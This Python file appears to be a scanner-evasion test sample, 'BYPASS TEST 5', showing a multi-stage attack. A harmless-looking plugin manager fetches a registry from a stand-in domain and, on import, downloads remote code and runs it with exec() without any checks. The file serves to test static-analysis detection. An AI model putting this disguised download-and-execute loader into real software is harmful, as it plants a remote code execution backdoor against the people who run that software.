#!/usr/bin/env python3
"""
BYPASS TEST 5: Multi-stage Attack

Stage 1 (this file) looks completely benign.
The actual payload is downloaded and executed at runtime.
This tests whether static analysis can catch deferred attacks.
"""
import urllib.request
import tempfile
import os

# Stage 1: Benign-looking "plugin loader"
class PluginManager:
    """Manages third-party plugins for the application."""

    REGISTRY_URL = "https://plugins.legit-looking-domain.com/registry.json"

    def __init__(self):
        self.plugins = []
        self.cache_dir = tempfile.mkdtemp(prefix="plugins_")

    def fetch_registry(self):
        """Download plugin registry."""
        resp = urllib.request.urlopen(self.REGISTRY_URL)
        return resp.read().decode()

    def install_plugin(self, plugin_url):
        """Download and install a plugin."""
        resp = urllib.request.urlopen(plugin_url)
        code = resp.read().decode()
        # "Install" = write to cache
        plugin_path = os.path.join(self.cache_dir, "plugin.py")
        with open(plugin_path, 'w') as f:
            f.write(code)
        # Load the plugin
        exec(compile(open(plugin_path).read(), plugin_path, 'exec'))

    def auto_update(self):
        """Check for and install updates."""
        registry = self.fetch_registry()
        import json
        data = json.loads(registry)
        for plugin in data.get('plugins', []):
            if plugin.get('auto_install'):
                self.install_plugin(plugin['url'])


# The innocent-looking initialization
pm = PluginManager()
pm.auto_update()
